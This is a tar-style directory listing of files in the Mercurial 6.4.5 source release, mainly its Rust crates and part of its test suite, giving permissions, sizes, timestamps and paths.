--rw-r--r--   0 alphare   (1000) alphare   (1000)     4905 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/dirstate/status.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1124 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/dirstate.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/rust/hg-core/src/dirstate_tree/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    67100 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/dirstate_tree/dirstate_map.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    28523 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/dirstate_tree/on_disk.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2558 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/dirstate_tree/owning.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5821 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/dirstate_tree/path_with_basename.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    38397 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/dirstate_tree/status.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)       99 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/dirstate_tree.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23458 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/discovery.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7336 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/errors.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)      762 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/exit_codes.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    24355 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/filepatterns.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4126 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/lib.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6596 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/lock.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3636 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/logging.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    55223 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/matchers.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3663 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/narrow.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.400352 mercurial-6.4.5/rust/hg-core/src/operations/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3364 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/operations/cat.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1080 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/operations/debugdata.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1256 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/operations/list_tracked_files.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)      409 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/operations/mod.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    28814 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/repo.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6518 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/requirements.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.404352 mercurial-6.4.5/rust/hg-core/src/revlog/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8676 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/revlog/changelog.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7553 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/revlog/filelog.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17658 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/revlog/index.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6653 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/revlog/manifest.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22422 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/revlog/mod.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13553 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/revlog/node.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    35756 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/revlog/nodemap.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3648 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/revlog/nodemap_docket.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12050 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/revlog/patch.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18978 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/revlog/path_encode.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2139 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/revset.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10371 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/sparse.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1769 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/testing.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.404352 mercurial-6.4.5/rust/hg-core/src/utils/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3045 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/utils/debug.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13256 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/utils/files.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    25568 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/utils/hg_path.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7801 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/utils/path_auditor.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15980 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/utils.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6554 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/src/vfs.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.404352 mercurial-6.4.5/rust/hg-core/tests/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11317 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-core/tests/test_missing_ancestors.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.404352 mercurial-6.4.5/rust/hg-cpython/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      404 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/Cargo.toml
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.404352 mercurial-6.4.5/rust/hg-cpython/src/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8565 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/ancestors.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7156 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/cindex.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1016 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/conversion.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7114 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/copy_tracing.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2410 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/dagops.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)      822 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/debug.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.404352 mercurial-6.4.5/rust/hg-cpython/src/dirstate/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3383 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/dirstate/copymap.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3741 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/dirstate/dirs_multiset.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18684 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/dirstate/dirstate_map.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6905 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/dirstate/item.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10077 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/dirstate/status.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2013 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/dirstate.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5795 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/discovery.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2332 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/exceptions.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2377 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/lib.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1590 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/pybytes_deref.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4126 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/ref_sharing.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17409 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/revlog.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1481 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hg-cpython/src/utils.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.404352 mercurial-6.4.5/rust/hgcli/
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.404352 mercurial-6.4.5/rust/hgcli/.cargo/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      671 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hgcli/.cargo/config
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23621 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hgcli/Cargo.lock
--rw-r--r--   0 alphare   (1000) alphare   (1000)      819 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hgcli/Cargo.toml
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1958 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hgcli/README.md
--rw-r--r--   0 alphare   (1000) alphare   (1000)      577 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hgcli/build.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11709 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hgcli/pyoxidizer.bzl
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.404352 mercurial-6.4.5/rust/hgcli/src/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1484 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/hgcli/src/main.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.404352 mercurial-6.4.5/rust/rhg/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      516 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/Cargo.toml
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1741 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/README.md
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.404352 mercurial-6.4.5/rust/rhg/src/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5429 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/src/blackbox.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7501 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/src/color.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.404352 mercurial-6.4.5/rust/rhg/src/commands/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4086 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/src/commands/cat.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1059 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/src/commands/config.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2059 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/src/commands/debugdata.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1036 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/src/commands/debugignorerhg.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)      598 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/src/commands/debugrequirements.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1491 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/src/commands/debugrhgsparse.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3149 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/src/commands/files.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)      862 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/src/commands/root.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22278 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/src/commands/status.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9491 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/src/error.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)    28326 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/src/main.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8975 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/src/ui.rs
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.404352 mercurial-6.4.5/rust/rhg/src/utils/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1756 2023-06-22 09:18:26.000000 mercurial-6.4.5/rust/rhg/src/utils/path_utils.rs
--rw-r--r--   0 alphare   (1000) alphare   (1000)       83 2023-06-22 09:18:26.000000 mercurial-6.4.5/rustfmt.toml
--rw-r--r--   0 alphare   (1000) alphare   (1000)       38 2023-06-22 09:18:52.444352 mercurial-6.4.5/setup.cfg
--rw-r--r--   0 alphare   (1000) alphare   (1000)    59222 2023-06-22 09:18:26.000000 mercurial-6.4.5/setup.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.440352 mercurial-6.4.5/tests/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      556 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/.balto.toml
--rw-r--r--   0 alphare   (1000) alphare   (1000)      141 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/README
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.440352 mercurial-6.4.5/tests/artifacts/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      396 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/artifacts/PURPOSE
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.440352 mercurial-6.4.5/tests/artifacts/cache/
--rw-r--r--   0 alphare   (1000) alphare   (1000)       33 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/artifacts/cache/big-file-churn.hg.md5
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.440352 mercurial-6.4.5/tests/artifacts/scripts/
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     4407 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/artifacts/scripts/generate-churning-bundle.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1558 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/autodiff.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1523 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/basic_test_result.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      593 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/binfile.bin
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1103 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/blackbox-readonly-dispatch.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.440352 mercurial-6.4.5/tests/blacklists/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      516 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/blacklists/README
--rw-r--r--   0 alphare   (1000) alphare   (1000)      992 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/blacklists/fsmonitor
--rw-r--r--   0 alphare   (1000) alphare   (1000)      443 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/blacklists/linux-vfat
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2242 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bruterebase.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.440352 mercurial-6.4.5/tests/bundles/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1314 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/darcs1.hg
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10686 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/hgweb+obs.hg
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2216 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/issue4041.hg
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4151 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/issue4438-r1.hg
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3864 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/issue4438-r2.hg
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2223 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/issue6528.hg-v1
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2406 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/issue6528.hg-v2
--rw-r--r--   0 alphare   (1000) alphare   (1000)    61440 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/issue6528.tar
--rw-r--r--   0 alphare   (1000) alphare   (1000)      548 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/legacy-encoding.hg
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1844 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/rebase-revset.hg
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1663 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/rebase.hg
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      484 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/rebase.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1768 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/remote.hg
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      520 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/remote.sh
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      346 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/rename.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1600 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/renames.hg
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1171 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/tampered.hg
--rw-r--r--   0 alphare   (1000) alphare   (1000)      847 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/test-invalid-branch-name.hg
--rw-r--r--   0 alphare   (1000) alphare   (1000)      302 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/test-keyword.hg
--rw-r--r--   0 alphare   (1000) alphare   (1000)      596 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/test-manifest.hg
--rw-r--r--   0 alphare   (1000) alphare   (1000)      947 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/test-merge-symlinks.hg
--rw-r--r--   0 alphare   (1000) alphare   (1000)      558 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/test-no-symlinks.hg
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1175 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/test-revlog-diff-relative-to-nullrev.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)    30720 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bundles/test-revlog-diff-relative-to-nullrev.tar
--rw-r--r--   0 alphare   (1000) alphare   (1000)      379 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/bzr-definitions
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1751 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/cgienv
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      343 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/check-gendoc
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2649 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/check-perf-code.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7340 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/common-pattern.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      247 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/crashgetbundler.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13103 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/drawdag.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2723 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/dumbhttp.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3302 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/dummysmtpd.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      893 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/dummyssh
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     7306 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/f
--rw-r--r--   0 alphare   (1000) alphare   (1000)      281 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/failfilemerge.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3043 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/fakedirstatewritetime.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      763 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/fakemergerecord.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1197 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/fakepatchtime.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      837 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/filterpyflakes.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1004 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/filtertraceback.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3850 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/flagprocessorext.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     4760 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/fsmonitor-run-tests.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3417 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/generate-working-copy-states.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3624 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/get-with-headers.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.440352 mercurial-6.4.5/tests/gpg/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      597 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/gpg/pubring.gpg
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1248 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/gpg/secring.gpg
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1280 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/gpg/trustdb.gpg
--rw-r--r--   0 alphare   (1000) alphare   (1000)      122 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/helper-runtests.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1975 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/helpers-testrepo.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)      592 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/heredoctest.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1807 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/hghave
--rw-r--r--   0 alphare   (1000) alphare   (1000)    30375 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/hghave.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1288 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/hgterm.ti
--rw-r--r--   0 alphare   (1000) alphare   (1000)      712 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/hgweberror.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      229 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/histedit-helpers.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3863 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/httpserverauth.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2172 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/hypothesishelpers.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     4279 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/killdaemons.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      551 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/library-infinitepush.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)      617 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/list-tree.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      641 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/lockdelay.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1842 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/logexceptions.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      874 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/ls-l.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      907 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/md5sum.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1077 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/missing-comment.hg
--rw-r--r--   0 alphare   (1000) alphare   (1000)      324 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/mockblackbox.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      494 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/mockmakedate.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      400 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/mocktime.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)       83 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/narrow-library.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)      866 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/notcapable
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1942 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/pdiff
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.440352 mercurial-6.4.5/tests/phabricator/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7191 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/accept-4564.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7072 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/accept-7913.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2669 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phab-conduit.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15402 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabimport-multi-drev.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    33114 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabimport-stack.json
